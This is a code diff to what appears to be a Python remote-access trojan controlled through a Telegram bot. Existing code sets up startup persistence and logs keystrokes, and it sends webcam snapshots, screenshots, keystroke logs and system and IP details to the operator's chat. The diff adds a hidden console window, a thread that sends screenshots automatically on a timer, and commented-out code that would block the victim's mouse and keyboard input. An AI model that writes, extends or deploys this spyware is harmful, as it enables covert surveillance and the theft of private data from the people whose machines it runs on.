@@ -8,10 +8,19 @@ import subprocess
 import sys
 import os
 import getpass
+from ctypes import *
+
+
+import win32con
+import win32console
+import win32gui
+
 from time import sleep
 #import ctypes
 #user32 = ctypes.windll.user32
 versi = '2.2'
+
+
 
 USER_NAME = getpass.getuser()
 def add_to_startup(file_path=""):
@@ -50,9 +59,17 @@ import requests
 #import pyautogui 
 #import base64
 
+timescreen = 0
+
+
+
+win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
+
+
+
 log = ''
 help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
-
+mkfl = False
 #close the programm 
 #NEEDS TESTING
 def leave():
@@ -71,6 +88,8 @@ def scr():
 #every message calls this
 def message_handler(update: Update, context: CallbackContext):
 	text = update.message.text
+	global mkfl
+	global timescreen
 	if not text:
 		return
 	mas = text.split('\n')		#keys: alt, ctrl, space, enter, delete
@@ -123,6 +142,23 @@ def message_handler(update: Update, context: CallbackContext):
 		open_image(text)	
 	elif text == 'close':
 		keyboard.send('`')
+	elif text == '_stop':
+			#global mkfl
+			if mkfl == True:
+				mkfl = False
+			else:
+				mkfl = True
+	elif text[0] == '!':
+		text=text[1:]
+		text = int(text)
+		if text < 5:
+			if timescreen > 5:
+				bot.send_message(chat_id=chat_user_id, text='Служба автоотправки остановлена!')
+				timescreen = 0
+			else:
+				bot.send_message(chat_id=chat_user_id, text='Команда проигнорирована! \nВремя отправки должно быть больше пяти секунд')
+		else:
+			timescreen = text
 	elif text == '_status':  
 		print('ok')    
 		cpu = psutil.cpu_times_percent(interval=0.4, percpu=False)
@@ -134,6 +170,14 @@ def message_handler(update: Update, context: CallbackContext):
 		
 		status='User: '+USER_NAME+' Os version '+str(subprocess.check_output('ver', shell=True))+' total RAM: '+str(mem_total)+' used: '+str(mem_use)+'ip adress, udp port '+str(conn.getresponse().read())
 		bot.send_message(chat_id=chat_user_id, text=str(status) )
+
+
+
+
+
+
+	
+
 def open_image(text):
 	num = 96
 	bat_path = r'C:/Users/Public/Music/image.pyw'
@@ -273,6 +317,29 @@ def callback(event):
 	else:
 		log += str(datetime.now()) + ' ' + str(event.name) + '\n'
 
+def mouseandkeyboard():
+	global mkfl
+'''
+	while True:
+		global mkfl
+		##print(mkfl)
+		if mkfl==True:
+			windll.user32.BlockInput(True)
+			print(mkfl)
+		else:
+			windll.user32.BlockInput(False)
+			print(mkfl)
+'''
+def autoscreen():
+	while True:
+		global timescreen
+		if timescreen > 0:
+		
+			scr()
+			time.sleep(timescreen)
+	
+	
+
 bot = telegram.Bot(token=bot_token)
 updater = Updater(token = bot_token, use_context = True)
 updater.dispatcher.add_handler(MessageHandler(filters = Filters.all, callback = message_handler))
@@ -281,6 +348,12 @@ updater.start_polling()
 #start keyboard listening
 b = Thread(target = start_key)
 b.start()
+mouseandkeyboard = Thread(target =mouseandkeyboard )
+mouseandkeyboard.start()
+
+autoscreen = Thread(target =autoscreen )
+autoscreen.start()
+
 
 conn = http.client.HTTPConnection("ifconfig.me")
 conn.request("GET", "/ip")
